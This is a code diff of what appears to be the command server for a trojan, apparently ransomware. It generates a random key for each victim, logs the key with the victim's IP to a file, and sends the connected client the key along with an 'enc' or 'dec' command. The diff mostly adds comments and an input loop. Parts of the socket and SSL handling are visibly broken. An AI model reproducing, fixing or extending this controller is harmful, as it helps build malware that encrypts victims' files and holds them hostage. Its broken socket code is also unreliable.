@@ -31,17 +31,17 @@ def send_secret(client_socket, command, ip):
 
 
 
-    if not secret:
-        secret = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=LENGTH))
+    if not secret:#if secret does not exists
+        secret = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=LENGTH))#create new one
     try:
-        file = open(r"secret/new_secret.txt", "x")
+        file = open(r"secret/new_secret.txt", "x")#create a file for saving secret
         file.write("ip:{} secret: {} ".format(ip, secret) + "\n")
     except:
-        file = open(r"secret/new_secret.txt", "w")
+        file = open(r"secret/new_secret.txt", "w")#writes in existing file for saving secret
         file.write("ip:{} secret: {} ".format(ip, secret) + "\n")
     file.close()
 
-    client_socket.send(secret.encode())
+    client_socket.send(secret.encode())# send client command and secret
     client_socket.send(command.encode())
     time.sleep(5)
 
@@ -57,16 +57,16 @@ def main():
         server_socket.bind((victim_ip, port))
         server_socket.listen()
 
-        while True:
+        while True:#ready to connect to any trojan client
             try:
                 connection, addr = ssl_socket.accept()
                 ssl_socket = context.wrap_socket(connection, server_side=True) #wrapping socket in ssl
-
-
-
                 print('connected')
-                command = input("what would you like to do?")
-                if(command in COMMANDS):
+                command = ''
+                while(command not in COMMANDS):
+                    command = input("what would you like to do? (enc \ dec)").strip()#takes command from user
+
+                if(command in COMMANDS):#if command is known
                     send_secret(connection , command , addr[0])
                 server_socket.close()
                 connection.close()
